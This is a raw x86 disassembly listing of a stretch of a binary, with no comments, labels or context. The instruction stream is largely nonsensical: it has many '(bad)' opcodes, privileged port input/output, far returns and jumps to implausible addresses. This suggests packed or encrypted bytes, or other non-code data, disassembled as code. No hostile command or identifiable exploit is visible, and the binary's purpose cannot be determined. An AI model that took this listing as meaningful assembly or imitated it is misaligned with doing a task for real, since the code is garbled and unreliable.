  412613:	dec    ecx
  412614:	out    dx,eax
  412615:	pusha  
  412616:	aas    
  412617:	mov    esp,0xbef9f7ad
  41261c:	addr16 mov dh,0x6f
  41261f:	xor    al,BYTE PTR [ebx+0x56d181e7]
  412625:	pop    es
  412626:	xchg   esi,eax
  412627:	dec    esi
  412628:	and    DWORD PTR [edi],ebx
  41262a:	xchg   esi,ebp
  41262c:	mov    esi,0x97b66563
  412631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412632:	xchg   ebp,eax
  412633:	push   0xdb9c14ac
  412638:	out    0xe8,eax
  41263a:	mov    BYTE PTR fs:[ebx-0x41e45b15],cl
  412641:	sbb    ebx,DWORD PTR [ecx+0x412d1d32]
  412647:	sub    BYTE PTR [edx],0x3e
  41264a:	or     BYTE PTR fs:[eax+0x77],bl
  41264e:	loope  0x4125d4
  412650:	mov    al,0xe5
  412652:	push   edi
  412653:	ins    BYTE PTR es:[edi],dx
  412654:	dec    esp
  412655:	sbb    eax,0x5b69eddf
  41265a:	outs   dx,BYTE PTR ds:[esi]
  41265b:	int3   
  41265c:	cmp    ah,dh
  41265e:	add    eax,DWORD PTR [eax+0x27]
  412661:	sub    al,0x19
  412663:	(bad)  
  412664:	cmp    al,0x76
  412666:	sub    al,0x40
  412668:	xor    eax,0xd11cbf73
  41266d:	sahf   
  41266e:	(bad)  
  41266f:	mov    eax,0xfd6ae559
  412674:	sbb    dl,BYTE PTR [ecx]
  412676:	retf   0xdd08
  412679:	(bad)  [ecx-0x72]
  41267c:	xchg   esi,eax
  41267d:	in     eax,0x97
  41267f:	mov    al,0xa2
  412681:	inc    esi
  412682:	xor    BYTE PTR [ecx-0x1],0x91
  412686:	jmp    0x412688
  412688:	stos   DWORD PTR es:[edi],eax
  412689:	test   BYTE PTR ds:0xb53b4e47,bl
  41268f:	sbb    al,0x6c
  412691:	sub    eax,0x5a90d65
  412696:	rcr    esi,0xdb
  412699:	stc    
  41269a:	dec    ecx
  41269b:	pop    esi
  41269c:	stc    
  41269d:	dec    ecx
  41269e:	loope  0x41264a
  4126a0:	test   al,0xb6
  4126a2:	mov    al,0x5
  4126a4:	push   edx
  4126a5:	mov    cl,bh
  4126a7:	mov    WORD PTR [ecx+0x57dcc066],?
  4126ad:	or     BYTE PTR [eax],0xd4
  4126b0:	cld    
  4126b1:	les    esi,FWORD PTR [edx+eax*4+0x31]
  4126b5:	dec    edi
  4126b6:	js     0x4126d1
  4126b8:	idiv   BYTE PTR [edx-0x48bbbce4]
  4126be:	(bad)  
  4126bf:	in     eax,dx
  4126c0:	xchg   edx,eax
  4126c1:	push   ss
  4126c2:	mov    ds:0x7e52d74f,eax
  4126c7:	dec    ecx
  4126c8:	adc    BYTE PTR [edi-0x51],cl
  4126cb:	mov    ebp,0xcbaaa1c
  4126d0:	fdiv   QWORD PTR [edx+0xb]
  4126d3:	and    eax,0x6512889a
  4126d8:	or     eax,0xc6e5561f
  4126dd:	push   es
  4126de:	iret   
  4126df:	pushf  
  4126e0:	dec    ebx
  4126e1:	dec    DWORD PTR [edx]
  4126e3:	inc    ebx
  4126e4:	push   ss
  4126e5:	fimul  DWORD PTR [eax+0x26]
  4126e8:	jbe    0x4126e2
  4126ea:	mov    ch,0xe0
  4126ec:	popf   
  4126ed:	getsec 
  4126ef:	pop    edx
  4126f0:	outs   dx,BYTE PTR ds:[esi]
  4126f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126f2:	(bad)
  4126f5:	and    al,0x4c
  4126f7:	arpl   WORD PTR [ecx-0x43937450],sp
  4126fd:	(bad)  
  4126fe:	int3   
  4126ff:	in     al,0xbd
  412701:	shr    BYTE PTR [ebx+0x6cd344e8],1
  412707:	fsubrp st(2),st
  412709:	mov    dh,0x1b
  41270b:	data16 ficomp WORD PTR [eax+eiz*1]
  41270f:	mov    ebx,0x10dcd956
  412714:	mov    edi,ebp
  412716:	pop    eax
  412717:	push   eax
  412718:	xchg   edx,eax
  412719:	int3   
  41271a:	loop   0x41274f
  41271c:	add    BYTE PTR [eax-0x407398],0xc3
  412723:	sahf   
  412724:	cs mov ebp,0x66154520
  41272a:	sub    bh,BYTE PTR [ebx-0x61]
  41272d:	adc    DWORD PTR [ecx],eax
  41272f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412730:	jmp    0x412739
  412732:	xor    bl,BYTE PTR [esi-0xbba38d5]
  412738:	cmp    DWORD PTR [ebp+0x45c7f89c],eax
  41273e:	mov    esp,0xf89c853a
  412743:	jmp    0x4129cb
  412748:	int    0xcb
  41274a:	ror    esp,0xd9
  41274d:	fcmove st,st(5)
  41274f:	leave  
  412750:	sub    al,0xaa
  412752:	(bad)  
  412754:	imul   edx,DWORD PTR [esi+0x6caa01ad],0x78
  41275b:	js     0x412742
  41275d:	jle    0x4127d7
  41275f:	js     0x41274f
  412761:	push   edx
  412762:	lods   eax,DWORD PTR ds:[esi]
  412763:	cdq    
  412764:	enter  0xf041,0x76
  412768:	sbb    esp,DWORD PTR [ebx+0x7e459a1f]
  41276e:	gs push ebp
  412770:	daa    
  412771:	jno    0x412781
  412773:	xchg   esi,eax
  412774:	std    
  412775:	jb     0x412769
  412777:	imul   edi,esp,0x5
  41277a:	pushf  
  41277b:	pusha  
  41277c:	mov    edx,0x3f47e004
  412781:	pop    edx
  412782:	arpl   WORD PTR [edi+0x4f650f3b],ax
  412788:	rcl    BYTE PTR [eax+0x1e],1
  41278b:	sub    DWORD PTR [ecx-0x36352df9],ebp
  412791:	stos   BYTE PTR es:[edi],al
  412792:	into   
  412793:	js     0x412759
  412795:	xor    ch,BYTE PTR [eax+0x1388bc0c]
  41279b:	dec    ecx
  41279c:	(bad)  
  41279d:	xchg   ebp,eax
  41279e:	adc    BYTE PTR [ebp-0x23],ah
  4127a1:	cdq    
  4127a2:	xchg   DWORD PTR [eax-0x47],esi
  4127a5:	rol    BYTE PTR [ebp+0x64426347],cl
  4127ab:	fwait
  4127ac:	dec    ecx
  4127ad:	scas   eax,DWORD PTR es:[edi]
  4127ae:	adc    DWORD PTR [ebx-0x15],edx
  4127b1:	mov    ebx,0xe8786307
  4127b6:	sbb    bh,dl
  4127b8:	pop    esi
  4127b9:	das    
  4127ba:	div    BYTE PTR [ebp-0x57]
  4127bd:	add    al,0x51
  4127c0:	ins    BYTE PTR es:[edi],dx
  4127c1:	retf   0x4217
  4127c4:	test   al,0xec
  4127c6:	dec    edi
  4127c7:	xchg   ebx,eax
  4127c8:	outs   dx,DWORD PTR ds:[esi]
  4127c9:	fld    DWORD PTR [edx+0x7e873ec4]
  4127cf:	or     al,0xe5
  4127d1:	das    
  4127d2:	lods   al,BYTE PTR ds:[esi]
  4127d3:	arpl   WORD PTR [esi+0x3a1091a5],cx
  4127d9:	arpl   sp,cx
  4127db:	mov    esp,0x50c8b8d4
  4127e0:	in     eax,dx
  4127e1:	(bad)  
  4127e2:	retf   0xd56b
  4127e5:	add    BYTE PTR [edi+0x6c],0xd0
  4127e9:	stc    
  4127ea:	and    ebp,DWORD PTR [ecx-0x7d992eec]
  4127f0:	pop    edx
  4127f1:	cs inc esi
  4127f3:	inc    edx
  4127f4:	adc    al,0xa5
  4127f6:	pop    ds
  4127f7:	inc    esi
  4127f8:	xchg   ecx,eax
  4127f9:	jno    0x412849
  4127fb:	jne    0x4127e4
  4127fd:	pushf  
  4127fe:	je     0x412868
  412800:	and    BYTE PTR [edx],0x71
  412803:	jae    0x4127c1
  412805:	or     cl,cl
  412807:	cs jbe 0x41283d
  41280a:	addr16 jl 0x412886
  41280d:	loopne 0x4127cd
  41280f:	mov    edi,0xb3dde0b0
  412814:	push   ss
  412815:	xchg   edi,eax
  412816:	or     eax,DWORD PTR [ebp-0x46]
  412819:	push   es
  41281a:	and    eax,0xaeebc70c
  41281f:	dec    eax
  412820:	rcl    BYTE PTR [eax+0xc678e7d],cl
  412826:	mov    al,ds:0xcb5eb6ce
  41282b:	pop    esp
  41282c:	mov    al,0x43
  41282e:	test   eax,0x15c63f5b
  412833:	mov    es,WORD PTR [edi-0x207c7695]
  412839:	mov    al,0xa7
  41283b:	(bad)  
  41283c:	cwde   
  41283d:	jnp    0x41287d
  41283f:	mov    ds:0x40f77df4,eax
  412844:	ficomp WORD PTR [eax-0x1b]
  412847:	scas   eax,DWORD PTR es:[edi]
  412848:	in     eax,dx
  412849:	das    
  41284a:	or     esp,ebx
  41284c:	loope  0x412854
  41284e:	or     eax,0x84e5772e
  412853:	int3   
  412854:	mov    ds:0x15caff6b,al
  412859:	push   edi
  41285a:	popa   
  41285b:	and    eax,DWORD PTR [ecx-0x286c5f3c]
  412861:	ret    0x9534
  412864:	xchg   esp,eax
  412865:	fisttp WORD PTR [edx+edi*1-0xe]
  412869:	jp     0x41285e
  41286b:	scas   eax,DWORD PTR es:[edi]
  41286c:	mov    ebx,0x217132f5
  412871:	jne    0x4128c6
  412873:	fdivr  DWORD PTR [eax]
  412875:	sbb    eax,0xdfe0cb59
  41287a:	fwait
  41287b:	push   edi
  41287c:	mov    ds,WORD PTR [edi+ecx*4]
  41287f:	aaa    
  412880:	fldcw  WORD PTR [edx-0x2cfd6106]
  412886:	mov    eax,ds:0x22e59b9c
  41288b:	clc    
  41288c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41288d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41288e:	dec    ebp
  41288f:	(bad)  
  412890:	(bad)  
  412891:	aam    0xe1
  412893:	mov    ds:0xdc7264fe,eax
  412898:	mov    ch,0x78
  41289a:	data16 jge 0x41290a
  41289d:	cwde   
  41289e:	(bad)  
  4128a0:	pop    eax
  4128a1:	(bad)  
  4128a2:	lea    edi,[edx+esi*8]
  4128a5:	call   0x805416a5
  4128aa:	lahf   
  4128ab:	and    edx,DWORD PTR [edx]
  4128ad:	jmp    0x412861
  4128af:	es cld 
  4128b1:	ins    BYTE PTR es:[edi],dx
  4128b2:	dec    ecx
  4128b3:	add    BYTE PTR [ebp-0x5e1c545d],cl
  4128b9:	int3   
  4128ba:	test   edi,ebp
  4128bc:	mov    ebp,0x9b50971a
  4128c1:	retf   0x8050
  4128c4:	enter  0x2c01,0x40
  4128c8:	ret    
  4128c9:	lock jo 0x4128df
  4128cc:	mov    eax,0x7b9b3e80
  4128d1:	dec    ebx
  4128d2:	lods   al,BYTE PTR ds:[esi]
  4128d3:	cmp    ah,BYTE PTR [edx+ecx*8-0x7b95efc]
  4128da:	fild   DWORD PTR [edi+0x5e]
  4128dd:	dec    esi
  4128de:	imul   esp,DWORD PTR [edi-0x6742ade7],0x59d37d67
  4128e8:	(bad)  
  4128e9:	call   0xdd98897b
  4128ee:	cdq    
  4128ef:	mov    eax,0xc1a6102c
  4128f4:	add    ebx,edi
  4128f6:	mov    esi,0xabbbfd12
  4128fb:	xchg   ebx,eax
  4128fc:	adc    BYTE PTR [edi-0x75fb1c00],ah
  412902:	loopne 0x41297f
  412904:	push   0xf8cefd69
  412909:	jp     0x4128f4
  41290b:	cmp    eax,DWORD PTR [eax]
  41290d:	(bad)  
  41290e:	test   DWORD PTR [ebp-0x33],ebx
  412911:	mov    ah,0xa7
  412913:	or     al,ch
  412915:	pusha  
  412916:	(bad)  
  412917:	js     0x412973
  412919:	pop    ecx
  41291a:	int    0x4b
  41291c:	neg    BYTE PTR [ecx+0x45]
  41291f:	jns    0x4128cf
  412921:	rcl    BYTE PTR [edx-0x2a],1
  412924:	es js  0x412939
  412927:	jae    0x412913
  412929:	sbb    DWORD PTR [esi],edx
  41292b:	inc    esp
  41292c:	and    DWORD PTR [eax+eax*8],ecx
  41292f:	push   ebx
  412930:	rep ins BYTE PTR es:[edi],dx
  412932:	icebp  
  412933:	mov    al,0x62
  412935:	int3   
  412936:	sti    
  412937:	add    eax,0x6a032268
  41293c:	push   cs
  41293d:	or     al,0x37
  41293f:	cmp    DWORD PTR [edi+ebx*8+0x2a],esp
  412943:	out    dx,al
  412944:	sub    al,0xf0
  412946:	in     eax,0x45
  412948:	outs   dx,BYTE PTR ds:[esi]
  412949:	in     al,0xf7
  41294b:	mov    cs,ebx
  41294d:	loop   0x412951
  41294f:	sub    BYTE PTR [edx-0x261a609c],bl
  412955:	retf   0x779b
  412958:	outs   dx,DWORD PTR ds:[esi]
  412959:	jmp    0x41298c
  41295b:	xchg   edx,eax
  41295c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41295d:	sub    BYTE PTR [ecx+0x550f5f8b],ch
  412963:	adc    dh,dh
  412965:	rcl    BYTE PTR [esi+0x23e32e8b],0xa2
  41296c:	fbstp  TBYTE PTR [edx]
  41296e:	mov    eax,fs
  412970:	dec    ecx
  412971:	pop    ss
  412972:	mov    eax,0x3c220cbd
  412977:	xchg   ebp,eax
  412978:	mov    edx,0x31420faa
  41297d:	fwait
  41297e:	imul   DWORD PTR [edi+0x66]
  412981:	pop    eax
  412982:	pop    ebx
  412983:	loop   0x4129d2
  412985:	push   esi
  412986:	sbb    DWORD PTR [eax+ebp*8],edi
  412989:	(bad)
  41298c:	push   esp
  41298d:	loop   0x412974
  41298f:	dec    edx
  412990:	loope  0x4129cb
  412992:	mov    dl,0x34
  412994:	adc    DWORD PTR [eax+0x17],ecx
  412997:	in     eax,dx
  412998:	add    BYTE PTR [edi+edi*2+0x2a],ch
  41299c:	daa    
  41299d:	adc    esi,DWORD PTR [ecx+0x2e]
  4129a0:	jecxz  0x412991
  4129a2:	out    0x8d,eax
  4129a4:	rcr    BYTE PTR [edi-0xac3971d],cl
  4129aa:	jl     0x412982
  4129ac:	hlt    
  4129ad:	mov    al,0xc
  4129af:	push   0x2f
  4129b1:	outs   dx,BYTE PTR ds:[esi]
  4129b2:	push   esi
  4129b3:	adc    ecx,DWORD PTR [edi-0x64]
  4129b6:	pop    ds
  4129b7:	enter  0x5f58,0x6
  4129bb:	mov    ah,0x35
  4129bd:	mov    edi,0x416f24e5
  4129c2:	sub    BYTE PTR [ebx+0x6e],bh
  4129c5:	xchg   ebx,eax
  4129c6:	popa   
  4129c7:	daa    
  4129c8:	adc    DWORD PTR [ebx],0xe8558b75
  4129ce:	xor    edx,eax
  4129d0:	add    edx,ecx
  4129d2:	jmp    0x41396f
  4129d7:	mov    edx,DWORD PTR [ebp-0x18]
  4129da:	xor    edx,eax
  4129dc:	add    edx,DWORD PTR [ebp-0x14]
  4129df:	jmp    0x412c67
  4129e4:	(bad)
  4129e7:	ret    0xc1ca
  4129ea:	(bad)
  4129ed:	xlat   BYTE PTR ds:[ebx]
  4129ee:	data16 ja 0x412974
  4129f1:	add    eax,0x711780ec
  4129f6:	js     0x412a70
  4129f8:	in     eax,0x7e
  4129fa:	js     0x412a74
  4129fc:	cmp    bh,al
  4129fe:	xchg   esi,eax
  4129ff:	mov    ds:0x69fe785,eax
  412a04:	jbe    0x412a66
  412a06:	and    BYTE PTR [edx+edi*8],al
  412a09:	lods   al,BYTE PTR ds:[esi]
  412a0a:	inc    ebx
  412a0b:	data16 mov es,WORD PTR [eax+0x18]
  412a0f:	adc    al,0x5b
  412a11:	(bad)  
  412a12:	sbb    bl,BYTE PTR [edi+ebp*1]
  412a15:	push   ecx
  412a16:	add    DWORD PTR [edx+0x9aa4a25],edi
  412a1c:	shl    BYTE PTR [eax+ebp*4],0x5b
  412a20:	retf   
  412a21:	push   ebx
  412a22:	adc    BYTE PTR [ebx+0xce51ca9],ah
  412a28:	ja     0x412aa2
  412a2a:	sbb    ebp,esp
  412a2c:	adc    dh,BYTE PTR ds:[edi-0x3db75ced]
  412a33:	sub    eax,DWORD PTR ds:0xf3e76c54
  412a39:	dec    esp
  412a3a:	mov    eax,DWORD PTR [edx]
  412a3c:	test   cl,dl
  412a3e:	add    BYTE PTR [ecx],ah
  412a40:	mov    ah,0xf4
  412a42:	lods   eax,DWORD PTR ds:[esi]
  412a43:	push   es
  412a44:	daa    
  412a45:	inc    esp
  412a46:	fimul  WORD PTR [ecx-0x7d]
  412a49:	fwait
  412a4a:	dec    ebx
  412a4b:	cmc    
  412a4c:	imul   esi,DWORD PTR [ecx],0x99e4653c
  412a52:	dec    eax
  412a53:	push   eax
  412a54:	sbb    al,0xa8
  412a56:	imul   ebp,DWORD PTR [ebx+0x46],0x30a453e4
  412a5d:	xor    eax,DWORD PTR ds:[eax]
  412a60:	inc    esi
  412a61:	adc    bl,cl
  412a63:	movaps xmm3,XMMWORD PTR [eax]
  412a66:	xlat   BYTE PTR ds:[ebx]
  412a67:	arpl   WORD PTR ds:0xf014ecdf,sp
  412a6d:	aas    
  412a6e:	dec    ecx
  412a6f:	popf   
  412a70:	xchg   ebx,eax
  412a71:	inc    esp
  412a72:	test   eax,0xbfe94935
  412a77:	push   0x81e6d2f7
  412a7c:	push   edx
  412a7d:	in     al,0x2e
  412a7f:	jno    0x412ab8
  412a81:	cmp    eax,edx
  412a83:	or     ah,bl
  412a85:	mov    ah,BYTE PTR [edx+0x71]
  412a88:	jb     0x412ac4
  412a8a:	inc    ecx
  412a8b:	or     al,0x1d
  412a8d:	jecxz  0x412a75
  412a8f:	xchg   ebx,eax
  412a90:	(bad)  
  412a92:	dec    ecx
  412a93:	pop    esi
  412a94:	inc    edi
  412a95:	lods   al,BYTE PTR ds:[esi]
  412a96:	mov    BYTE PTR [ebx-0x7acd268],ah
  412a9c:	cmp    dl,BYTE PTR [ebx+ecx*2-0x61]
  412aa0:	mov    esi,0x6a64e9ee
  412aa5:	ret    
  412aa6:	sbb    eax,0xe1fd3964
  412aab:	test   BYTE PTR [ebp+0xfde58f7],dl
  412ab1:	mov    esi,esp
  412ab3:	aad    0x4c
  412ab5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ab6:	stc    
  412ab7:	mov    WORD PTR [ecx+0x14],es
  412aba:	inc    ebx
  412abb:	adc    BYTE PTR ds:0x82704cd0,0x4
  412ac2:	add    ecx,DWORD PTR [edx]
  412ac4:	sbb    al,0x62
  412ac6:	gs cli 
  412ac8:	sub    BYTE PTR [ebp-0x7d558dfd],cl
  412ace:	cdq    
  412acf:	icebp  
  412ad0:	and    ebx,DWORD PTR [eax-0x21c3633f]
  412ad6:	cmp    edx,edi
  412ad8:	retf   
  412ad9:	xor    dl,ch
  412adb:	sbb    DWORD PTR [esi-0x48],ebx
  412ade:	dec    ebx
  412adf:	mov    edx,0x1c3ca963
  412ae4:	push   eax
  412ae5:	xor    al,0xbd
  412ae7:	push   ebx
  412ae8:	loopne 0x412a7a
  412aea:	inc    edi
  412aeb:	xchg   edi,eax
  412aec:	ins    DWORD PTR es:[edi],dx
  412aed:	pop    ds
  412aee:	lods   al,BYTE PTR ds:[esi]
  412aef:	add    al,0x2e
  412af1:	cmp    al,0xba
  412af3:	jmp    0x79e0:0xd88282cc
  412afa:	ins    DWORD PTR es:[edi],dx
  412afb:	add    eax,0x4fdebdf8
  412b00:	jge    0x412a82
  412b02:	dec    esp
  412b03:	push   edi
  412b04:	dec    ecx
  412b05:	mov    DWORD PTR [eax+0xf],eax
  412b08:	out    0x97,eax
  412b0a:	xlat   BYTE PTR ds:[ebx]
  412b0b:	mov    bl,0xf6
  412b0d:	imul   ebp,DWORD PTR [ecx-0x33ca363a],0x5bdabe7
  412b17:	add    eax,0xce544291
  412b1c:	fs push ds
  412b1e:	fisubr DWORD PTR cs:[ebx]
  412b21:	xchg   ecx,eax
  412b22:	push   eax
  412b23:	fcomp  DWORD PTR [edx]
  412b25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b26:	sahf   
  412b27:	cmp    edx,DWORD PTR ds:0xb07d84c7
  412b2d:	and    DWORD PTR [ebx],ecx
  412b2f:	and    BYTE PTR [edx-0xe6cfaeb],bl
  412b35:	sub    eax,0x322e14c1
  412b3a:	dec    ebp
  412b3b:	gs into 
  412b3d:	sbb    eax,0xeb0abdbf
  412b42:	xchg   ecx,eax
  412b43:	sbb    BYTE PTR [esp+edi*1-0x3f2a153b],ch
  412b4a:	push   esi
  412b4b:	cmp    ch,dl
  412b4d:	cmp    BYTE PTR [esi+edx*1],bl
  412b50:	xor    eax,0x1c02f3fe
  412b55:	xchg   edi,eax
  412b56:	add    ax,0x79a0
  412b5a:	nop
  412b5b:	inc    ebx
  412b5c:	pop    esi
  412b5d:	push   esp
  412b5e:	xor    DWORD PTR [edi+0x11],edi
  412b61:	aam    0xf3
  412b63:	mov    al,0x6e
  412b65:	std    
  412b66:	enter  0xcd48,0xa0
  412b6a:	pushf  
  412b6b:	xor    DWORD PTR [edi],ebx
  412b6d:	dec    edx
  412b6e:	loop   0x412bce
  412b70:	pop    esp
  412b71:	cmp    DWORD PTR [esi+ebx*4],esp
  412b74:	mov    ah,0x7
  412b76:	and    edx,ebx
  412b78:	and    eax,0x62dacfc2
  412b7d:	adc    BYTE PTR [edi-0x2c],ch
  412b80:	jne    0x412bea
  412b82:	shl    DWORD PTR [ebp-0x2d9751ff],cl
  412b88:	jnp    0x412b52
  412b8a:	outs   dx,DWORD PTR ds:[esi]
  412b8b:	int3   
  412b8c:	sbb    DWORD PTR [ebx+edx*1],ebp
  412b8f:	fsubr  DWORD PTR [eax]
  412b91:	xlat   BYTE PTR ds:[ebx]
  412b92:	jmp    0xc07d68b6
  412b97:	imul   DWORD PTR [edx+0x36df837]
  412b9d:	mov    ch,0x15
  412b9f:	fadd   DWORD PTR [ebp+0x678e7ed6]
  412ba5:	bound  ebp,QWORD PTR ds:0x4eb19c7a
  412bab:	cmp    ecx,esp
  412bad:	xchg   eax,ecx
  412baf:	fstp   QWORD PTR [edx-0x4a]
  412bb2:	sub    al,0xb0
  412bb4:	pusha  
  412bb5:	sbb    al,0xd7
  412bb7:	dec    edx
  412bb8:	in     eax,dx
  412bb9:	(bad)
  412bbe:	dec    esi
  412bbf:	cs ret 
  412bc1:	lock aam 0x74
  412bc4:	mov    ds:0xdc0236a5,eax
  412bc9:	jno    0x412b88
  412bcb:	xchg   esp,eax
  412bcc:	out    0xc9,al
  412bce:	cmc    
  412bcf:	bswap  eax
  412bd1:	pusha  
  412bd2:	adc    ch,bl
  412bd4:	inc    esp
  412bd5:	jp     0x412bca
  412bd7:	push   ds
  412bd8:	add    al,0x13
  412bda:	push   esp
  412bdb:	lea    edx,[ebp+0x28064f5a]
  412be1:	xchg   edi,eax
  412be2:	dec    esp
  412be3:	sahf   
  412be4:	out    0x1,al
  412be6:	in     al,0xa9
  412be8:	je     0x412c1f
  412bea:	xor    DWORD PTR [ecx+0x34],esp
  412bed:	inc    eax
  412bee:	inc    ebx
  412bef:	inc    ebp
  412bf0:	push   esi
  412bf1:	aaa    
  412bf2:	xor    cl,BYTE PTR [edi+ebx*2-0x60]
  412bf6:	xor    esi,DWORD PTR [eax-0x75512d99]
  412bfc:	fdiv   QWORD PTR [edx+0x5]
  412bff:	cmp    DWORD PTR [edx],ebx
  412c01:	sub    esp,DWORD PTR [edx]
  412c03:	push   ebx
  412c04:	sbb    ebx,DWORD PTR [edx+eiz*8-0x4e]
  412c08:	rcr    DWORD PTR [ecx+0x696a151c],1
  412c0e:	outs   dx,DWORD PTR ds:[esi]
  412c0f:	into   
  412c10:	call   0x4dc34fe9
  412c15:	retf   0x133c
  412c18:	inc    edi
  412c19:	ror    DWORD PTR [eax],cl
  412c1b:	shl    DWORD PTR [edx],1
  412c1d:	rcr    BYTE PTR [edx+0x18],1
  412c20:	inc    ebx
  412c21:	loopne 0x412c92
  412c23:	out    dx,eax
  412c24:	xor    eax,0x479de2b1
  412c29:	out    0x3d,eax
  412c2b:	jae    0x412c86
  412c2d:	in     eax,0x58
  412c2f:	sub    eax,0x9c3fa65a
  412c34:	inc    esp
  412c35:	dec    edx
  412c36:	dec    ebp
  412c37:	iret   
  412c38:	sbb    al,0x7f
  412c3a:	and    BYTE PTR ds:0xa60d2762,al
  412c40:	pop    ss
  412c41:	(bad)  
  412c42:	in     eax,dx
  412c43:	inc    edx
  412c44:	push   cs
  412c45:	outs   dx,DWORD PTR ds:[esi]
  412c46:	fwait
  412c47:	rcr    DWORD PTR [ebp*1+0x553c9380],1
  412c4e:	data16 mov ah,0xe5
  412c51:	jbe    0x412c44
  412c53:	retf   
  412c54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c55:	or     ebx,DWORD PTR [ecx+0x21]
  412c58:	dec    edi
  412c59:	in     eax,0x1f
  412c5b:	adc    DWORD PTR [eax],0xb1ba3e17
  412c61:	dec    edi
  412c62:	popf   
  412c63:	aam    0xc0
  412c65:	cli    
  412c66:	lods   al,BYTE PTR ds:[esi]
  412c67:	mov    edi,DWORD PTR [ebp-0x1c]
  412c6a:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412c71:	jmp    0x412ef9
  412c76:	int    0xcc
  412c78:	xlat   BYTE PTR ds:[ebx]
  412c79:	enter  0xdbd9,0xd5
  412c7d:	shl    DWORD PTR [ebx-0x62],1
  412c80:	std    
  412c81:	xchg   DWORD PTR [eax-0x46],esi
  412c84:	bound  edx,QWORD PTR [edx]
  412c86:	cld    
  412c87:	ja     0x412d01
  412c89:	js     0x412c70
  412c8b:	jle    0x412d05
  412c8d:	js     0x412cc3
  412c8f:	inc    edx
  412c90:	jp     0x412cd3
  412c92:	das    
  412c93:	and    edx,ebx
  412c95:	adc    eax,ebx
  412c97:	jns    0x412c6d
  412c99:	adc    al,BYTE PTR [ebx]
  412c9b:	iret   
  412c9c:	lahf   
  412c9d:	fist   DWORD PTR [eax+0x644e0d18]
  412ca3:	jae    0x412cf9
  412ca5:	ds pop edx
  412ca7:	mov    cl,0x92
  412ca9:	xchg   esi,eax
  412caa:	mov    eax,0x5574fb48
  412caf:	in     al,0xcc
  412cb1:	or     eax,0x92350b6
  412cb6:	es iret 
  412cb8:	pusha  
  412cb9:	test   DWORD PTR [ebp+0x35d9dba2],ebp
  412cbf:	sbb    BYTE PTR [esi-0x20],dh
  412cc2:	dec    eax
  412cc3:	xchg   edx,eax
  412cc4:	pusha  
  412cc5:	loope  0x412cdf
  412cc7:	sbb    al,BYTE PTR ds:0xe37673de
  412ccd:	cmp    ch,dl
  412ccf:	mov    BYTE PTR [ebx+0x2e],0x6a
  412cd3:	mov    ah,0xe8
  412cd5:	mov    ds:0x277b0a5c,eax
  412cda:	pop    edi
  412cdb:	mov    ebp,0x4e98bed0
  412ce0:	popf   
  412ce1:	in     eax,dx
  412ce2:	out    dx,eax
  412ce3:	pusha  
  412ce4:	xlat   BYTE PTR ds:[ebx]
  412ce5:	fnsave [eax]
  412ce7:	ins    DWORD PTR es:[edi],dx
  412ce8:	test   al,0xdc
  412cea:	je     0x412c83
  412cec:	mov    eax,0x5b4137d7
  412cf1:	lock add DWORD PTR [ecx-0x18488b3f],esi
  412cf8:	fiadd  DWORD PTR [edi-0x2c]
  412cfb:	xchg   esi,eax
  412cfc:	js     0x412d0f
  412cfe:	dec    edi
  412cff:	jb     0x412d77
  412d01:	cmc    
  412d02:	and    BYTE PTR [ebp+ecx*8-0x4fd70c58],al
  412d09:	es int 0xb0
  412d0c:	inc    ebx
  412d0d:	or     BYTE PTR ds:0x852fc0fb,0x93
  412d15:	sub    edx,DWORD PTR [ebp+eax*1+0x4d01fa31]
  412d1c:	pusha  
  412d1d:	dec    eax
  412d1e:	push   ss
  412d1f:	leave  
  412d20:	je     0x412cd0
  412d22:	push   edx
  412d23:	outs   dx,DWORD PTR ds:[esi]
  412d24:	inc    esi
  412d25:	aas    
  412d26:	adc    al,0x5e
  412d28:	adc    al,0xb1
  412d2a:	mov    ds:0x25f8ee9f,eax
  412d2f:	les    edx,FWORD PTR [edi+eax*4+0x56579f11]
  412d36:	pop    DWORD PTR [ebx]
  412d38:	test   al,0x6a
  412d3a:	pop    bp
  412d3c:	adc    DWORD PTR [eax],ebx
  412d3e:	pop    edx
  412d3f:	test   DWORD PTR [edx-0x3fd3d6e3],esi
  412d45:	fist   DWORD PTR [edi-0x6561d077]
  412d4b:	js     0x412da3
  412d4d:	outs   dx,BYTE PTR ds:[esi]
  412d4e:	mov    ds:0xe925815f,eax
  412d53:	sbb    eax,0xe6d12685
  412d58:	cs cli 
  412d5a:	ins    DWORD PTR es:[edi],dx
  412d5b:	mov    edi,0xf3a87911
  412d60:	test   BYTE PTR [eax],bl
  412d62:	xchg   esp,eax
  412d63:	icebp  
  412d64:	in     eax,dx
  412d65:	aaa    
  412d66:	ss push ebx
  412d68:	jb     0x412d69
  412d6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d6c:	fsub   DWORD PTR [edi]
  412d6e:	push   es
  412d6f:	inc    edi
  412d70:	sbb    esp,DWORD PTR [ebx+0x49a5b919]
  412d76:	push   edi
  412d77:	sub    DWORD PTR [edx-0x3c],eax
  412d7a:	mov    edi,DWORD PTR [edx+edx*8-0x38]
  412d7e:	mov    ds:0xa8bafd36,al
  412d83:	adc    BYTE PTR [edx+0x28],0x33
  412d87:	lods   al,BYTE PTR ds:[esi]
  412d88:	mov    DWORD PTR [eax+0x75],edx
  412d8b:	sub    al,0x8
  412d8d:	mov    esp,0xe453da68
  412d92:	push   edx
  412d93:	mov    eax,0x1eb0a2c4
  412d98:	xchg   dl,al
  412d9a:	pushf  
  412d9b:	jb     0x412dc9
  412d9d:	dec    ebp
  412d9e:	out    0x8,al
  412da0:	addr16 jo 0x412d83
  412da3:	in     eax,dx
  412da4:	jmp    0x633302ee
  412da9:	aad    0x1f
  412dab:	or     eax,0xe868fd82
  412db0:	mov    gs,ebx
  412db2:	xor    edx,esi
  412db4:	pop    ebx
  412db5:	cmc    
  412db6:	jae    0x412d65
  412db8:	pop    ss
  412db9:	mov    dl,0x72
